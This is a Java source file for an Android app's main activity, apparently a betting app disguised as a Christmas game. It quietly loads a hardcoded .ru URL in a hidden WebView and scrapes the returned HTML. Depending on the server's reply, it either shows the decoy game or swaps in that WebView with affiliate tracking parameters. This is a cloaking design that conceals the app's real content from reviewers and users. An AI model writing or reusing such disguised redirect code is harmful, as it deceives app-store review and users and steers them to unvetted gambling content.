package com.parimatch.imagineluck;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.fragment.app.FragmentTransaction;

import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.graphics.drawable.AnimationDrawable;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.webkit.CookieSyncManager;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.Toast;

import com.facebook.FacebookSdk;
import com.onesignal.OneSignal;

public class MainActivity extends AppCompatActivity {

    private static MainActivity instance;
    private FrameLayout christmasContainer;
    private WebView merryWeb;
    private String maryUrl = "http://bilobektns.ru/Z4rvdcCY";
    private ImageView merryLoadAnim;
    private final static int FILECHOOSER_RESULTCODE = 1;
    public static final int REQUEST_SELECT_FILE = 100;
    private ValueCallback<Uri> mUplMessage;
    public ValueCallback<Uri[]> uplMessage;
    private static final String ONESIGNAL_APP_ID = "5db3eac7-5b94-41b8-9a8d-6570b66d58b9";
    private boolean isMaryNet = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        navigationOff();
        initElems();
        merryAnim();
        setMerryWeb();
        instance = this;

        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);
        OneSignal.initWithContext(this);
        OneSignal.setAppId(ONESIGNAL_APP_ID);

        FacebookSdk.sdkInitialize(getApplicationContext());
        FacebookSdk.setAutoInitEnabled(true);
        FacebookSdk.fullyInitialize();

        checkNet();
    }

    private void checkNet() {
        ConnectivityManager connectivityManager = (ConnectivityManager)getSystemService(Context.CONNECTIVITY_SERVICE);
        if(connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE).getState() == NetworkInfo.State.CONNECTED ||
                connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI).getState() == NetworkInfo.State.CONNECTED) {
            getNetHtml();
        }
        else{
            getChristmasFrag();
        }
    }

    private void getChristmasFrag() {
        merryWeb.setVisibility(View.GONE);

        setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);
        FragmentTransaction fTransaction = getSupportFragmentManager().beginTransaction();
        fTransaction.add(R.id.christmas_container, new ChristmasFragment(),"christmastag");
        fTransaction.commit();

        merryLoadAnim.setVisibility(View.GONE);
        christmasContainer.setVisibility(View.VISIBLE);
    }

    private void getNetHtml() {
        WebSettings st = merryWeb.getSettings();
        st.setJavaScriptEnabled(true);
        merryWeb.addJavascriptInterface(new JSHInterface(), "HTMLOUT");

        merryWeb.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                merryWeb.loadUrl("javascript:HTMLOUT.processHTML(document.documentElement.outerHTML);");
            }
        });

        merryWeb.loadUrl(maryUrl);
        merryWeb.setVisibility(View.GONE);
    }

    public static MainActivity getInstance() {
        return instance;
    }

    private void setMerryWeb() {
        WebSettings ws = merryWeb.getSettings();
        ws.setJavaScriptEnabled(true);
        ws.setSupportZoom(false);
        ws.setAllowFileAccess(true);
        ws.setAllowContentAccess(true);

        merryWeb.setWebViewClient(new WebViewClient());
        merryWeb.setWebChromeClient(new WebChromeClient());

        CookieSyncManager.createInstance(merryWeb.getContext());
        CookieSyncManager.getInstance().sync();

        merryWeb.getSettings().setJavaScriptEnabled(true);
        merryWeb.getSettings().setDomStorageEnabled(true);
        merryWeb.requestFocus(View.FOCUS_DOWN);

        merryWeb.setWebChromeClient(new WebChromeClient()
        {
            // For 3.0+ Devices (Start)
            // onActivityResult attached before constructor
            protected void openFileChooser(ValueCallback uploadMsg, String acceptType)
            {
                mUplMessage = uploadMsg;
                Intent i = new Intent(Intent.ACTION_GET_CONTENT);
                i.addCategory(Intent.CATEGORY_OPENABLE);
                i.setType("image/*");
                startActivityForResult(Intent.createChooser(i, "File Browser"), FILECHOOSER_RESULTCODE);
            }

            // For Lollipop 5.0+ Devices
            @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
            public boolean onShowFileChooser(WebView mWebView, ValueCallback<Uri[]> filePathCallback, WebChromeClient.FileChooserParams fileChooserParams)
            {
                if (uplMessage != null) {
                    uplMessage.onReceiveValue(null);
                    uplMessage = null;
                }

                uplMessage = filePathCallback;

                Intent intent = fileChooserParams.createIntent();
                try
                {
                    startActivityForResult(intent, REQUEST_SELECT_FILE);
                } catch (ActivityNotFoundException e)
                {
                    uplMessage = null;
                    Toast.makeText(getApplicationContext(), "Cannot Open File Chooser", Toast.LENGTH_LONG).show();
                    return false;
                }
                return true;
            }

            //For Android 4.1 only
            protected void openFileChooser(ValueCallback<Uri> uploadMsg, String acceptType, String capture)
            {
                mUplMessage = uploadMsg;
                Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
                intent.addCategory(Intent.CATEGORY_OPENABLE);
                intent.setType("image/*");
                startActivityForResult(Intent.createChooser(intent, "File Browser"), FILECHOOSER_RESULTCODE);
            }

            protected void openFileChooser(ValueCallback<Uri> uploadMsg)
            {
                mUplMessage = uploadMsg;
                Intent i = new Intent(Intent.ACTION_GET_CONTENT);
                i.addCategory(Intent.CATEGORY_OPENABLE);
                i.setType("image/*");
                startActivityForResult(Intent.createChooser(i, "File Chooser"), FILECHOOSER_RESULTCODE);
            }
        });
    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent intent) {
        super.onActivityResult(requestCode, resultCode, intent);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            if (requestCode == REQUEST_SELECT_FILE) {
                if (uplMessage == null)
                    return;
                uplMessage.onReceiveValue(WebChromeClient.FileChooserParams.parseResult(resultCode, intent));
                uplMessage = null;
            }
        } else if (requestCode == FILECHOOSER_RESULTCODE) {
            if (null == mUplMessage)
                return;
            // Use MainActivity.RESULT_OK if you're implementing WebView inside Fragment
            // Use RESULT_OK only if you're implementing WebView inside an Activity
            Uri result = intent == null || resultCode != RESULT_OK ? null : intent.getData();
            mUplMessage.onReceiveValue(result);
            mUplMessage = null;
        } else
            Toast.makeText(getApplicationContext(), "Failed to Upload Image", Toast.LENGTH_LONG).show();
    }

    public void happyMaryChristmas(){
        String maryStr = "";

        try {
            maryStr = JSHInterface.tasker.getMaryNetStr();
        } catch (Exception ex) {
        }

        if (maryStr.length() > 95) {
            isMaryNet = true;

            if (!JSHInterface.tasker.getPartUri().equals("")) {
                maryUrl += "?subId1=MRCHR&subId2=MRCHR&subId3=MRCHR&subId4=MRCHR&subId5=MRCHR";
                String components[] = JSHInterface.tasker.getPartUri().split("//");

                for (int i = 0; i < components.length; i++) {
                    maryUrl = maryUrl.replaceFirst("MRCHR", components[i]);
                }
                maryUrl = maryUrl.replaceAll("MRCHR", "");
            }
            Log.d("--- URL ---", maryUrl);

            merryLoadAnim.setVisibility(View.GONE);
            christmasContainer.setVisibility(View.GONE);
            merryWeb.setVisibility(View.VISIBLE);
        }
        else {
            getChristmasFrag();
        }
    }

    private void merryAnim() {
        merryLoadAnim.setBackgroundResource(R.drawable.merry_anim);
        AnimationDrawable anim = (AnimationDrawable) merryLoadAnim.getBackground();
        anim.start();
    }

    private void initElems() {
        christmasContainer = findViewById(R.id.christmas_container);
        merryWeb = findViewById(R.id.merry_web);
        merryLoadAnim = findViewById(R.id.merry_load_anim);
    }

    @Override
    public void onBackPressed() {
        if (isMaryNet && merryWeb.canGoBack()) {
            merryWeb.goBack();
        }
        else if(!isMaryNet && (getSupportFragmentManager().findFragmentByTag("infotag") != null || getSupportFragmentManager().findFragmentByTag("bettag") != null)){
            setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);
            FragmentTransaction fTransaction = getSupportFragmentManager().beginTransaction();
            fTransaction.replace(R.id.christmas_container, new ChristmasFragment(),"christmastag");
            fTransaction.commit();
        }
        else{
            super.onBackPressed();
        }
    }

    private void navigationOff() {
        View dgw = getWindow().getDecorView();
        dgw.setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                                | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                                | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                                | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                                | View.SYSTEM_UI_FLAG_FULLSCREEN
                                | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);
    }

    @Override
    public void onWindowFocusChanged(boolean focus) {
        super.onWindowFocusChanged(focus);
        navigationOff();
    }
}